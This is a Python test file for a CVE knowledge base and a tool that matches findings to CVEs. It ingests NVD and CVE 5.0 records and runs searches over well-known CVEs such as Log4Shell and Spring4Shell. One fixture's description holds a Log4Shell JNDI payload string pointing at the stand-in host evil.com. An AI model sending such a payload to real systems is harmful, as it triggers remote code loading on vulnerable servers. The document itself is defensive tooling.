"""
Unit and integration tests for CVE Knowledge Base, Models, and Finding-to-CVE Correlation.
"""

import json
from pathlib import Path
import pytest

from argus.evidence.model import Evidence
from argus.knowledge.cve_correlator import CVECorrelator
from argus.knowledge.cve_kb import CVEKnowledgeBase
from argus.knowledge.cve_models import CVECorrelationSuggestion, CVEEntry
from argus.reporting.models import CVSSData, CWEInfo, Finding, VulnerabilityReport
from argus.vector.store import VectorStore


@pytest.fixture
def in_memory_vector_store():
    """Create a fast in-memory VectorStore for test isolation."""
    store = VectorStore(db_path=":memory:", use_sqlite_vec=False)
    yield store
    store.close()


@pytest.fixture
def cve_kb(in_memory_vector_store):
    """Create a CVEKnowledgeBase instance backed by in-memory VectorStore."""
    return CVEKnowledgeBase(vector_store=in_memory_vector_store)


@pytest.fixture
def sample_cves():
    """Sample dataset of prominent real-world CVEs across diverse categories."""
    return [
        CVEEntry(
            cve_id="CVE-2021-44228",
            title="Apache Log4j2 JNDI Remote Code Execution (Log4Shell)",
            description="Apache Log4j2 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.",
            severity="critical",
            cvss_score=10.0,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            cwes=["CWE-502", "CWE-400"],
            affected_products=["Apache Log4j", "log4j-core"],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
        ),
        CVEEntry(
            cve_id="CVE-2022-22965",
            title="Spring Framework Remote Code Execution via Data Binding (Spring4Shell)",
            description="A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment.",
            severity="critical",
            cvss_score=9.8,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            cwes=["CWE-94"],
            affected_products=["Spring Framework", "Apache Tomcat", "Spring MVC"],
            references=["https://tanzu.vmware.com/security/cve-2022-22965"],
        ),
        CVEEntry(
            cve_id="CVE-2023-38606",
            title="Apple Kernel Memory Corruption Elevation of Privilege",
            description="An app may be able to modify sensitive kernel state. Apple is aware of a report that this issue may have been actively exploited.",
            severity="high",
            cvss_score=7.8,
            cvss_vector="CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
            cwes=["CWE-119", "CWE-787"],
            affected_products=["Apple iOS", "Apple iPadOS", "Apple macOS"],
            references=["https://support.apple.com/en-us/HT213841"],
        ),
        CVEEntry(
            cve_id="CVE-2019-16759",
            title="vBulletin Pre-Auth Remote Code Execution via AJAX Widget",
            description="vBulletin 5.x before 5.5.4 allows remote attackers to execute arbitrary PHP code via the widgetConfig parameter in an ajax/render/widget_tabbedcontainer request.",
            severity="critical",
            cvss_score=9.8,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            cwes=["CWE-94", "CWE-78"],
            affected_products=["vBulletin"],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2019-16759"],
        ),
        CVEEntry(
            cve_id="CVE-2020-0618",
            title="Microsoft SQL Server Reporting Services Remote Code Execution",
            description="A remote code execution vulnerability exists in Microsoft SQL Server Reporting Services when the server incorrectly validates user input, allowing an attacker to execute arbitrary code in the context of the Reporting Services service account.",
            severity="high",
            cvss_score=8.8,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            cwes=["CWE-502", "CWE-20"],
            affected_products=["Microsoft SQL Server Reporting Services", "SQL Server"],
            references=["https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0618"],
        ),
        CVEEntry(
            cve_id="CVE-2021-34527",
            title="Windows Print Spooler Remote Code Execution (PrintNightmare)",
            description="A remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations. An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges.",
            severity="critical",
            cvss_score=8.8,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            cwes=["CWE-269"],
            affected_products=["Microsoft Windows", "Windows Server"],
            references=["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527"],
        ),
        CVEEntry(
            cve_id="CVE-2017-5638",
            title="Apache Struts2 Content-Type Header Remote Code Execution",
            description="The Jakarta Multipart parser in Apache Struts 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 has incorrect exception handling and error-message generation during file-upload attempts, which allows remote attackers to execute arbitrary commands via a crafted Content-Type, Content-Disposition, or Content-Length HTTP header.",
            severity="critical",
            cvss_score=10.0,
            cvss_vector="CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            cwes=["CWE-78", "CWE-20"],
            affected_products=["Apache Struts", "Struts 2"],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2017-5638"],
        ),
        CVEEntry(
            cve_id="CVE-2020-14882",
            title="Oracle WebLogic Server Remote Code Execution via Console Path Traversal",
            description="Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server.",
            severity="critical",
            cvss_score=9.8,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            cwes=["CWE-287", "CWE-22"],
            affected_products=["Oracle WebLogic Server"],
            references=["https://www.oracle.com/security-alerts/cpuoct2020.html"],
        ),
    ]


def test_cve_entry_model_serialization():
    """Test CVEEntry creation, to_dict, from_dict, and to_embedding_text methods."""
    cve = CVEEntry(
        cve_id="CVE-2021-44228",
        title="Log4Shell RCE",
        description="JNDI LDAP deserialization leading to remote code execution.",
        severity="critical",
        cvss_score=10.0,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        cwes=["CWE-502", "CWE-400"],
        affected_products=["Apache Log4j", "log4j-core"],
        references=["https://example.com/log4j"],
        published_date="2021-12-10",
        metadata={"vendor": "Apache"},
    )

    d = cve.to_dict()
    assert d["cve_id"] == "CVE-2021-44228"
    assert d["severity"] == "critical"
    assert d["cvss_score"] == 10.0
    assert "CWE-502" in d["cwes"]
    assert "Apache Log4j" in d["affected_products"]
    assert d["metadata"]["vendor"] == "Apache"

    # Reconstruct from dict
    cve_recovered = CVEEntry.from_dict(d)
    assert cve_recovered.cve_id == cve.cve_id
    assert cve_recovered.description == cve.description
    assert cve_recovered.cvss_score == 10.0
    assert cve_recovered.cwes == ["CWE-502", "CWE-400"]

    # Embedding text representation
    embed_text = cve.to_embedding_text()
    assert "CVE ID: CVE-2021-44228" in embed_text
    assert "Title: Log4Shell RCE" in embed_text
    assert "CWEs: CWE-502, CWE-400" in embed_text
    assert "Affected Products: Apache Log4j, log4j-core" in embed_text


def test_cve_entry_from_dict_flexible_parsing():
    """Test CVEEntry.from_dict resilience to missing keys, string scores, and alternative keys."""
    data = {
        "id": "CVE-2022-0001",
        "summary": "Sample vulnerability description",
        "score": "7.5",
        "cwe": "CWE-89, CWE-79",
        "products": "MySQL, PostgreSQL",
        "refs": "https://example.com/cve",
    }
    cve = CVEEntry.from_dict(data)
    assert cve.cve_id == "CVE-2022-0001"
    assert cve.description == "Sample vulnerability description"
    assert cve.cvss_score == 7.5
    assert "CWE-89" in cve.cwes and "CWE-79" in cve.cwes
    assert "MySQL" in cve.affected_products and "PostgreSQL" in cve.affected_products
    assert "https://example.com/cve" in cve.references


def test_cve_correlation_suggestion_serialization():
    """Test CVECorrelationSuggestion model and serialization."""
    cve = CVEEntry(
        cve_id="CVE-2021-44228",
        title="Log4Shell",
        description="Remote code execution in Log4j",
    )
    sugg = CVECorrelationSuggestion(
        cve_id="CVE-2021-44228",
        cve_title="Log4Shell",
        cve_description="Remote code execution in Log4j",
        finding_id="f-101",
        finding_title="JNDI Injection in Search Parameter",
        correlation_score=0.88,
        vector_similarity=0.85,
        cwe_match=True,
        tech_match=True,
        category_match=True,
        rationale="Vector similarity 0.85; Matched CWE-502; Matched Log4j",
        matched_cwes=["CWE-502"],
        matched_products=["Apache Log4j"],
        cve_entry=cve,
    )

    d = sugg.to_dict()
    assert d["cve_id"] == "CVE-2021-44228"
    assert d["correlation_score"] == 0.88
    assert d["cwe_match"] is True
    assert d["tech_match"] is True
    assert d["cve_entry"]["cve_id"] == "CVE-2021-44228"

    recovered = CVECorrelationSuggestion.from_dict(d)
    assert recovered.cve_id == "CVE-2021-44228"
    assert recovered.finding_id == "f-101"
    assert recovered.cve_entry is not None
    assert recovered.cve_entry.cve_id == "CVE-2021-44228"


def test_cve_kb_ingest_and_get(cve_kb, sample_cves):
    """Test ingesting CVEEntry objects and retrieving by ID."""
    count = cve_kb.ingest_entries(sample_cves)
    assert count == len(sample_cves)
    assert cve_kb.count() == len(sample_cves)

    # Lookup existing
    entry = cve_kb.get_cve("CVE-2021-44228")
    assert entry is not None
    assert entry.cve_id == "CVE-2021-44228"
    assert "Log4j" in entry.title
    assert entry.cvss_score == 10.0

    # Lookup non-existent
    assert cve_kb.get_cve("CVE-9999-99999") is None


def test_cve_kb_ingest_records(cve_kb):
    """Test ingesting CVEs from raw dictionary payloads."""
    records = [
        {
            "cve_id": "CVE-2023-1111",
            "title": "SQL Injection in User Login",
            "description": "SQL injection vulnerability allows unauthenticated access.",
            "severity": "critical",
            "cvss_score": 9.8,
            "cwes": ["CWE-89"],
            "affected_products": ["Custom App"],
        },
        {
            "cve_id": "CVE-2023-2222",
            "title": "Reflected XSS in Search Query",
            "description": "Cross-site scripting flaw in search parameter.",
            "severity": "medium",
            "cvss_score": 6.1,
            "cwes": ["CWE-79"],
            "affected_products": ["Web Portal"],
        },
    ]

    count = cve_kb.ingest_records(records)
    assert count == 2
    assert cve_kb.count() == 2

    entry = cve_kb.get_cve("CVE-2023-1111")
    assert entry is not None
    assert "CWE-89" in entry.cwes


def test_cve_kb_ingest_json_file_simple(cve_kb, tmp_path):
    """Test ingesting CVEs from a simple JSON file list."""
    json_path = tmp_path / "cves.json"
    data = [
        {
            "cve_id": "CVE-2023-3001",
            "title": "Authentication Bypass in Admin Portal",
            "description": "Flaw allows arbitrary session creation.",
            "severity": "critical",
            "cvss_score": 9.8,
            "cwes": ["CWE-287"],
            "affected_products": ["AdminApp"],
        }
    ]
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(data, f)

    count = cve_kb.ingest_file(json_path)
    assert count == 1
    assert cve_kb.get_cve("CVE-2023-3001") is not None


def test_cve_kb_ingest_json_file_nvd20(cve_kb, tmp_path):
    """Test ingesting CVEs from NVD 2.0 API JSON format."""
    nvd_file = tmp_path / "nvd_feed.json"
    nvd_data = {
        "format": "NVD_CVE",
        "version": "2.0",
        "vulnerabilities": [
            {
                "cve": {
                    "id": "CVE-2021-44228",
                    "descriptions": [
                        {"lang": "en", "value": "Apache Log4j2 JNDI remote code execution."}
                    ],
                    "metrics": {
                        "cvssMetricV31": [
                            {
                                "cvssData": {
                                    "version": "3.1",
                                    "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                                    "baseScore": 10.0,
                                    "baseSeverity": "CRITICAL",
                                }
                            }
                        ]
                    },
                    "weaknesses": [
                        {
                            "description": [
                                {"lang": "en", "value": "CWE-502"}
                            ]
                        }
                    ],
                    "configurations": [
                        {
                            "nodes": [
                                {
                                    "cpeMatch": [
                                        {"criteria": "cpe:2.3:a:apache:log4j:2.14.1:*:*:*:*:*:*:*"}
                                    ]
                                }
                            ]
                        }
                    ],
                    "references": [
                        {"url": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"}
                    ],
                }
            }
        ],
    }

    with open(nvd_file, "w", encoding="utf-8") as f:
        json.dump(nvd_data, f)

    count = cve_kb.ingest_file(nvd_file)
    assert count == 1
    entry = cve_kb.get_cve("CVE-2021-44228")
    assert entry is not None
    assert entry.cvss_score == 10.0
    assert "CWE-502" in entry.cwes
    assert "apache log4j" in [p.lower() for p in entry.affected_products]


def test_cve_kb_ingest_json_file_cve50(cve_kb, tmp_path):
    """Test ingesting CVEs from CVE 5.0 JSON schema format."""
    cve5_file = tmp_path / "cve5_record.json"
    cve5_data = {
        "dataType": "CVE_RECORD",
        "dataVersion": "5.0",
        "cveMetadata": {
            "cveId": "CVE-2022-22965",
            "datePublished": "2022-04-01T00:00:00Z",
        },
        "containers": {
            "cna": {
                "title": "Spring Framework RCE (Spring4Shell)",
                "descriptions": [
                    {"lang": "en", "value": "Remote code execution via class loader data binding."}
                ],
                "metrics": [
                    {
                        "cvssV3_1": {
                            "baseScore": 9.8,
                            "baseSeverity": "CRITICAL",
                            "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        }
                    }
                ],
                "affected": [
                    {"vendor": "VMware", "product": "Spring Framework"}
                ],
                "problemTypes": [
                    {
                        "descriptions": [
                            {"cweId": "CWE-94", "description": "Improper Control of Generation of Code"}
                        ]
                    }
                ],
            }
        },
    }

    with open(cve5_file, "w", encoding="utf-8") as f:
        json.dump(cve5_data, f)

    count = cve_kb.ingest_file(cve5_file)
    assert count == 1
    entry = cve_kb.get_cve("CVE-2022-22965")
    assert entry is not None
    assert entry.title == "Spring Framework RCE (Spring4Shell)"
    assert entry.cvss_score == 9.8
    assert "CWE-94" in entry.cwes
    assert "VMware Spring Framework" in entry.affected_products


def test_cve_kb_ingest_directory(cve_kb, tmp_path):
    """Test recursive directory ingestion."""
    sub1 = tmp_path / "feed1"
    sub2 = tmp_path / "feed2"
    sub1.mkdir()
    sub2.mkdir()

    with open(sub1 / "cve_a.json", "w", encoding="utf-8") as f:
        json.dump([{"cve_id": "CVE-2020-0001", "description": "Desc A", "severity": "low"}], f)

    with open(sub2 / "cve_b.json", "w", encoding="utf-8") as f:
        json.dump([{"cve_id": "CVE-2020-0002", "description": "Desc B", "severity": "high"}], f)

    total = cve_kb.ingest_directory(tmp_path)
    assert total == 2
    assert cve_kb.count() == 2
    assert cve_kb.get_cve("CVE-2020-0001") is not None
    assert cve_kb.get_cve("CVE-2020-0002") is not None


def test_cve_kb_semantic_search(cve_kb, sample_cves):
    """Test semantic search retrieval over CVE descriptions."""
    cve_kb.ingest_entries(sample_cves)

    # 1. Search for Log4j / JNDI LDAP code execution
    results = cve_kb.search_cves("JNDI LDAP remote code execution exploit", top_k=3)
    assert len(results) > 0
    top_cve, top_score = results[0]
    assert top_cve.cve_id == "CVE-2021-44228"
    assert top_score > 0.4

    # 2. Search for Windows Print Spooler privilege escalation
    spooler_results = cve_kb.search_cves("Windows print spooler SYSTEM privilege execution", top_k=3)
    assert len(spooler_results) > 0
    spooler_ids = [c.cve_id for c, _ in spooler_results]
    assert "CVE-2021-34527" in spooler_ids

    # 3. Search for Struts multipart header code execution
    struts_results = cve_kb.search_cves("Apache Struts multipart content-type arbitrary command execution", top_k=3)
    assert len(struts_results) > 0
    assert struts_results[0][0].cve_id == "CVE-2017-5638"


def test_cve_kb_search_with_filters(cve_kb, sample_cves):
    """Test semantic search with severity, CWE, and product filters."""
    cve_kb.ingest_entries(sample_cves)

    # Filter by severity
    crit_results = cve_kb.search_cves("remote code execution", severity="critical", top_k=10)
    assert len(crit_results) > 0
    for cve, _ in crit_results:
        assert cve.severity.lower() == "critical"

    # Filter by CWE
    cwe_results = cve_kb.search_cves("remote code execution", cwe="CWE-502", top_k=5)
    assert len(cwe_results) > 0
    for cve, _ in cwe_results:
        assert "CWE-502" in cve.cwes or "502" in cve.description

    # Filter by affected product
    prod_results = cve_kb.search_cves("remote execution", affected_product="Spring", top_k=5)
    assert len(prod_results) > 0
    assert prod_results[0][0].cve_id == "CVE-2022-22965"


def test_cve_kb_clear(cve_kb, sample_cves):
    """Test clearing all CVE records from knowledge base."""
    cve_kb.ingest_entries(sample_cves)
    assert cve_kb.count() == len(sample_cves)

    deleted = cve_kb.clear()
    assert deleted == len(sample_cves)
    assert cve_kb.count() == 0
    assert cve_kb.get_cve("CVE-2021-44228") is None


def test_cve_correlator_finding_matching(cve_kb, sample_cves):
    """Test CVECorrelator finding-to-CVE hybrid matching engine."""
    cve_kb.ingest_entries(sample_cves)
    correlator = CVECorrelator(cve_kb=cve_kb)

    # Finding 1: Log4j JNDI injection
    finding_log4j = Finding(
        id="find-001",
        title="JNDI LDAP Injection in User-Agent Header",
        category="rce",
        severity="critical",
        cvss=CVSSData(score=10.0, vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", severity_rating="Critical"),
        cwe=CWEInfo(id="502", name="Deserialization of Untrusted Data"),
        host="logging.internal.corp",
        endpoint="/api/v1/auth",
        parameter="User-Agent",
        description="The application logs incoming HTTP User-Agent headers using Apache Log4j 2.14.0. Passing a JNDI payload '${jndi:ldap://evil.com/x}' triggers out-of-band LDAP lookup and remote code execution.",
        tags=["apache", "log4j", "rce", "jndi"],
    )

    suggestions = correlator.correlate_finding(finding_log4j, top_k=3, min_score=0.4)
    assert len(suggestions) > 0

    top_match = suggestions[0]
    assert top_match.cve_id == "CVE-2021-44228"
    assert top_match.finding_id == "find-001"
    assert top_match.cwe_match is True
    assert top_match.tech_match is True
    assert top_match.correlation_score >= 0.70
    assert "Log4j" in top_match.rationale or "502" in top_match.rationale


def test_cve_correlator_tech_and_cwe_bonus(cve_kb, sample_cves):
    """Test that CWE alignment and technology overlap boost the correlation score."""
    cve_kb.ingest_entries(sample_cves)
    correlator = CVECorrelator(cve_kb=cve_kb)

    # Finding with explicit Struts technology and CWE-78
    finding_struts = Finding(
        id="find-struts",
        title="Command Injection in File Upload via Content-Type Header",
        category="rce",
        severity="critical",
        cwe=CWEInfo(id="78", name="OS Command Injection"),
        host="struts-app.example.com",
        endpoint="/upload.action",
        description="Jakarta multipart parser improper error handling in Apache Struts allows arbitrary command execution.",
        tags=["apache struts", "struts2", "rce"],
    )

    suggestions = correlator.correlate_finding(finding_struts, top_k=3)
    assert len(suggestions) > 0
    top_sugg = suggestions[0]
    assert top_sugg.cve_id == "CVE-2017-5638"
    assert top_sugg.cwe_match is True
    assert top_sugg.tech_match is True


def test_cve_correlator_correlate_evidence(cve_kb, sample_cves):
    """Test correlating a raw Evidence object directly."""
    cve_kb.ingest_entries(sample_cves)
    correlator = CVECorrelator(cve_kb=cve_kb)

    ev = Evidence(
        evidence_id="ev-999",
        title="Spring Framework ClassLoader Data Binding Exposure",
        category="rce",
        severity="critical",
        description="Spring MVC application on Tomcat exposes ClassLoader manipulation via parameter data binding.",
        tags=["spring", "tomcat", "rce"],
    )

    suggestions = correlator.correlate_evidence(ev, top_k=3)
    assert len(suggestions) > 0
    assert suggestions[0].cve_id == "CVE-2022-22965"


def test_cve_correlator_correlate_report(cve_kb, sample_cves):
    """Test correlating all findings in a VulnerabilityReport."""
    cve_kb.ingest_entries(sample_cves)
    correlator = CVECorrelator(cve_kb=cve_kb)

    finding1 = Finding(
        id="f1",
        title="Log4j JNDI RCE",
        category="rce",
        severity="critical",
        cwe=CWEInfo(id="502", name="Deserialization"),
        tags=["log4j"],
        description="Log4j LDAP deserialization",
    )
    finding2 = Finding(
        id="f2",
        title="Spring4Shell Data Binding RCE",
        category="rce",
        severity="critical",
        cwe=CWEInfo(id="94", name="Code Injection"),
        tags=["spring framework"],
        description="Spring Framework class loader binding",
    )

    report = VulnerabilityReport(
        report_id="rep-100",
        mission_id="m-100",
        target="example.com",
        findings=[finding1, finding2],
    )

    correlations = correlator.correlate_report(report)
    assert "f1" in correlations
    assert "f2" in correlations
    assert correlations["f1"][0].cve_id == "CVE-2021-44228"
    assert correlations["f2"][0].cve_id == "CVE-2022-22965"


def test_cve_correlator_threshold_filtering(cve_kb, sample_cves):
    """Test that unrelated findings with low scores do not return false positive suggestions."""
    cve_kb.ingest_entries(sample_cves)
    correlator = CVECorrelator(cve_kb=cve_kb)

    # An informational finding completely unrelated to the sample CVEs
    unrelated_finding = Finding(
        id="f-info",
        title="Missing X-Frame-Options Header",
        category="clickjacking",
        severity="info",
        description="The web server does not set an X-Frame-Options response header, allowing embedding in iframe.",
        tags=["clickjacking", "headers"],
    )

    # With high threshold (0.60), should return 0 suggestions
    suggestions = correlator.correlate_finding(unrelated_finding, min_score=0.60)
    assert len(suggestions) == 0
